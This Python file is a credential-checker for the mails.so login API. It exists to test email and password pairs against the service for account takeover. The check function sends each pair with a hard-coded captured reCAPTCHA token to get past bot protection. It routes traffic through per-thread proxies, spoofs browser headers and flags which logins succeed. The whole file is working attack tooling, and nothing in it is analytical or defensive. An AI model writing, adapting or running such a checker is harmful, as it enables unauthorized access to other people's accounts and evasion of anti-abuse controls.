"""
Checker for mails.so – login only, no credit fetching.
Uses a static reCAPTCHA token (you can replace it).
"""
import requests
import threading
from typing import Tuple

BASE_URL = "https://api.mails.so"
LOGIN_URL = BASE_URL + "/auth/login"
TIMEOUT = 15

# Use the token you captured earlier (replace with a fresh one if needed)
STATIC_TOKEN = "0cAFcWeA5QwgLXOu2LWkmRim_GMkuRZnKs2e6tUv7cVMRnJyStl4JLn6QARqUBK-z5DjKnluLuOPito37AQpUPetfhQunCT34XUwHxshDiIqppmRWEVQPn7bLHEmy1Nj9dL0Os7_9GSRwPCzK9QnaazgiW9GLHwcPWdqX1gQO4DJf_0yN0ZtaCbkoHMeA_XmD0xbSWt5JuUXx4hp8IgoqTxBl4TJ2xnc2CUHS1ULwGXQX8h0LfVbVC8n_2O-FMrvgR-Hi74smS-2IOIe5VTNkzoOtfTS0xOuN0ynKm78odYjudd5psC8DcdWbAUy9KGZJDy_kZWqf1Qw0Y2aswlXV926FGbyjRdNmk1vn22GtzcciJee51SnF04GhSs0Ta9dmmUAf9UvT77irOqRF_4Drkcuwfd4AOXBUUDix-bBzmPsQrVjULS92woYb3_ilh7dpGA79gKa4zTwC71tNk6xfYT9S1p0b15dLeOeW4w1T5Ndz_QM3PE89WV8QuaWiIT0qGgfHGZJcjurGFp34QQDSQG69LptX1r993JO_kAeJ-K4RsV_6bNDR2i4Gqe4Cq2ZrGvmbb7OHX-SgzHZ-X3FzCqhYLsUFxgYxYGIiu6xggaAZeebQt38ViFEW-b-U5lRtB39HE6NSsImHFa9ETSl6gqQXYV8Fpadz44WfR9PFgwHR2nJxvfv9ZHTE8DkiWP6gXpbyUmS8k3ak2Oy-haYTprH-tKlBvJqkRLaI1A3MIcGcUMaKPU6hU5Fgm9tEUq87mmT9TUtuna8hZqjsngA8VxOOSplDVSKtZ_fWHpKw-0IupC84L4aQe4KjVZXrmsxsC2AU-oixzd_p0rBMrtZqm8mwIyftpL_Skwdx2e1-EpTTBuPGUXpgouEGSesX8holYIsd62AuqNuHGRjnaAdStfT04SgKY8Igeovov_yHnfg9d0_YO6AH_7EhJaj81PGulh-lOJ4QxE--0XZ5hXquFAaveM-rCemYtF6bBynACNgoKx-VluCOS9iKRSzf9OXehtTI-1uBYQ6unvmgbUBKqaAwM5C2K6xL5ol7rqsuoaZv_-jI2kOmZxNLvx3ZXtsLDWNpz5npKTxNZPgev5WEkHIq1wlnShHp2PeNTBaBdCFmDHkORzp1-CRZTM5AlP5XFboC86Y84U3XoSYrugOOeJjW_AKP9TkYzRelmr3FqP08gzcFC_XTpoQ4O2kWUcJ6hMWMVAAwfbSsW2E6FaGPyvM885MDbQd6i4kjpITg_ZogAfVt4mPjMhHysNpAbd--097oY1QWSEJHN7pgo6Xx7FkMaZBeYJnjjtDp7TKjH4UboRwlBG1a-AGqvTciQWhfRFLi8-TUlIt_-0TtACHy6uJEcJH5cgI2OfPzipDXOTOSYdyzc1rFbaY9MJBxXAxaZYL-W5lLMBrS8K7SM71nR1zKk7sjXJhBQJPAywx0v1Wuh29zGsRWvDA0d6O7F_b_-N6O2VZlozCO8EZ3_J0l9flFc1mC1zRJgr556qqzyvSjR9LYRVcYXbIeYCRjExCW0bQOvnujZbtHds3c-4fd2jO81ypenkghpe0_6fSLQNP0AwCgN_qwSO7wxKggHdbr6BOyqupJcys8td2cNB-36yIYHTnT3B6XRDhN4LF839jsx-MbpaAhBsOysxaRbV4hRoh_LW18oT4d5-PgpCmhpcd9Eaqn6F9LAnsrMS82h9urCgM8DyDxH01aNRl5AeocKI-IzG4QMijNyDLvtSgPNuIGzj43Lge-qgjVk4Yo06CPg-lOo3ILQRD_PKwpMRZt_2-QZAr3Qlo2JLzsXftSGUrm8DAf7pQexpW2wSjyjyJFEyFa8RHewiSCk25AhD6t8BEer-C0qzbIdLnQyF01aIE-LQmTX7Y5tDlxp7AR2MA5_TJLyrtFS_2sYznmmC_G78XGuwJomjp4UvGyPLTI9C0nBsatgz-sDdifAbPXBA9tWGdGW7a5YwLUkXSrpQpuIfwu0BQ-J6-y2O64KSkIuUDDrBIGUyd2jUycHux96UND6duqDG3yrScnBI_LYXv_f5sOhZdKgOEVuQT1wUDcw5c2CA975BdPuuMEX7y7w4_t2UVrYVMnLZKIhe4GwBHaSI6JOotgjsu5CucjOEfZ_NfOS3mHTTdS8Lgr7Ib4Bq0NJKwP4DCdQb9tnP1mrtvbzkUeNy09jPVFyskaPHcOPvsEgjcZH8P6YwUwlGrFYoKmE9ojyPJqPt6FotBZW6FV3XQ0wNV2ZY4HEJpb0VTlE2hKSV1UY9tNjG0HAZSiBzkKu-RTybWbmMFs5yKSu5F2gGejBZ8KFlWNhiez79YPshMIquTKgmlVKaI7KUCgneVbUdz-tLPwGXNg"

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://mails.so",
        "Referer": "https://mails.so/login",
    })

    payload = {
        "email": email,
        "password": password,
        "recaptchaToken": STATIC_TOKEN
    }

    try:
        resp = session.post(LOGIN_URL, json=payload, timeout=TIMEOUT)
        try:
            data = resp.json()
        except ValueError:
            return False, f"Invalid JSON: {resp.text[:100]}"

        # Success if status is "success" or message is "Logged in"
        if data.get("status") == "success" or data.get("message") == "Logged in":
            return True, "Login successful"
        else:
            msg = data.get("message", "Unknown error")
            return False, f"Login failed: {msg}"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"